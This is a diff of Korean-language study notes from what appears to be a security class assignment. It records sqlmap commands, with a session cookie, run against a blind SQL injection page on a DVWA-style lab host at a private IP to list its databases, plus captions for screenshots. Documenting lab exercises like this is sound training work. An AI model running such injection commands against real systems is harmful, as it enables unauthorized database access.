@@ -338,5 +338,9 @@ impossible
 
 
 zap 에서 취약한 파라미터를 찾고 sqlmap을 활용해 sql injection (과제)
-`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli_blind/ --data "id=1&Submit=Submit" -p id --dbs`
-![[Pasted image 20241008143607.png]]
+`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=low" -u "http://192.168.56.120/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -p id --dbs`
+취약점 리스트
+![[Pasted image 20241008144850.png]]
+
+데이터베이스 리스트
+![[Pasted image 20241008144906.png]]
